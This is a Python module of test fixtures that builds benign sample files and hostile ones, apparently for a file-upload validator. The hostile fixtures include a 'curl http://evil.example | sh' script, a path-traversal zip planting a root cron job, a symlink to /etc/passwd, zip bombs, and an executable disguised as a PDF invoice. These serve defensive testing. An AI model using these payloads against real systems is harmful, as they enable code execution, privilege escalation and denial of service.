"""Generated file fixtures: benign samples of each allowed type and hostile ones."""

from __future__ import annotations

import io
import struct
import wave
import zipfile

import pikepdf
from PIL import Image

# --- Hostile ---------------------------------------------------------------------------


def pe_executable() -> bytes:
    """Minimal PE: DOS header (``MZ``) pointing at a ``PE\\0\\0`` header."""
    dos = bytearray(b"MZ" + b"\x90\x00" + b"\x00" * 60)  # 64-byte DOS header
    struct.pack_into("<I", dos, 0x3C, 0x40)
    pe = b"PE\x00\x00" + struct.pack("<HHIIIHH", 0x14C, 1, 0, 0, 0, 0xE0, 0x102)
    return bytes(dos) + pe + b"\x00" * 256


def elf_executable() -> bytes:
    ident = b"\x7fELF\x02\x01\x01" + b"\x00" * 9
    header = struct.pack("<HHIQQQIHHHHHH", 2, 0x3E, 1, 0x400000, 64, 0, 0, 64, 56, 1, 64, 0, 0)
    return ident + header + b"\x00" * 256


def macho_executable() -> bytes:
    return b"\xcf\xfa\xed\xfe" + struct.pack("<iiIIII", 0x01000007, 3, 2, 0, 0, 0) + b"\x00" * 64


def shell_script() -> bytes:
    return b"#!/bin/sh\ncurl http://evil.example | sh\n"


# --- Benign ----------------------------------------------------------------------------


def pdf(**info: str) -> bytes:
    document = pikepdf.new()
    document.add_blank_page()
    if info:
        with document.open_metadata() as meta:
            meta["dc:creator"] = [info.get("author", "")]
        for key, value in info.items():
            document.docinfo[f"/{key.capitalize()}"] = value
    out = io.BytesIO()
    document.save(out)
    return out.getvalue()


def png() -> bytes:
    out = io.BytesIO()
    Image.new("RGB", (16, 16), "yellow").save(out, "PNG")
    return out.getvalue()


def jpeg(exif: Image.Exif | None = None) -> bytes:
    out = io.BytesIO()
    Image.new("RGB", (32, 24), "orange").save(out, "JPEG", exif=exif or Image.Exif())
    return out.getvalue()


def wav(seconds: float = 0.2, rate: int = 16000) -> bytes:
    out = io.BytesIO()
    with wave.open(out, "wb") as w:
        w.setnchannels(1)
        w.setsampwidth(2)
        w.setframerate(rate)
        w.writeframes(b"\x00\x00" * int(seconds * rate))
    return out.getvalue()


def mp3(frames: int = 20, tags: bool = False) -> bytes:
    """MPEG-1 Layer III, 128 kbit/s, 44.1 kHz: 417-byte frames of silence."""
    frame = b"\xff\xfb\x90\x64" + b"\x00" * 413
    body = frame * frames
    if not tags:
        return body
    from mutagen.id3 import ID3, TALB, TIT2, TPE1

    tagged = io.BytesIO(body)
    id3 = ID3()
    id3.add(TIT2(encoding=3, text="Nagranie z pasieki"))  # pyright: ignore[reportUnknownMemberType]
    id3.add(TPE1(encoding=3, text="Jan Kowalski"))  # pyright: ignore[reportUnknownMemberType]
    id3.add(TALB(encoding=3, text="Prywatne"))  # pyright: ignore[reportUnknownMemberType]
    id3.save(tagged)  # pyright: ignore[reportUnknownMemberType]
    return tagged.getvalue()


def _zip(entries: dict[str, bytes], compression: int = zipfile.ZIP_DEFLATED) -> bytes:
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w", compression) as archive:
        for name, data in entries.items():
            archive.writestr(name, data)
    return out.getvalue()


_CONTENT_TYPES = (
    b'<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/'
    b'content-types"><Override PartName="/word/document.xml" ContentType="application/vnd.'
    b'openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>'
)


def docx(macros: bool = False) -> bytes:
    entries = {
        "[Content_Types].xml": _CONTENT_TYPES,
        "_rels/.rels": b"<Relationships/>",
        "word/document.xml": b"<w:document><w:body>Miod</w:body></w:document>",
    }
    if macros:
        entries["word/vbaProject.bin"] = b"\xd0\xcf\x11\xe0" + b"\x00" * 512
    return _zip(entries)


def plain_zip(**entries: bytes) -> bytes:
    return _zip(entries or {"notes.txt": b"hello"})


def high_ratio_zip(megabytes: int = 50) -> bytes:
    """One entry of zeros: ratio far beyond 100:1."""
    return _zip({"zeros.bin": b"\x00" * (megabytes * 1024 * 1024)})


def nested_zip(depth: int = 3) -> bytes:
    """42.zip-style: archives inside archives."""
    data = high_ratio_zip(2)
    for level in range(depth):
        data = _zip({f"level{level}.zip": data, f"copy{level}.zip": data})
    return data


def traversal_zip() -> bytes:
    return _zip({"../../etc/cron.d/evil": b"* * * * * root sh"})


def symlink_zip() -> bytes:
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w") as archive:
        info = zipfile.ZipInfo("link")
        info.create_system = 3
        info.external_attr = 0o120777 << 16
        archive.writestr(info, "/etc/passwd")
    return out.getvalue()


def executable_in_zip() -> bytes:
    return _zip({"faktura.pdf": pe_executable()})


def lying_size_zip() -> bytes:
    """The central directory claims a tiny uncompressed size; the data is 4 MB of zeros."""
    data = bytearray(_zip({"small.txt": b"\x00" * (4 * 1024 * 1024)}))
    cd = data.rfind(b"PK\x01\x02")
    struct.pack_into("<I", data, cd + 24, 10)  # central directory: uncompressed size
    struct.pack_into("<I", data, 22, 10)  # local header: uncompressed size
    return bytes(data)
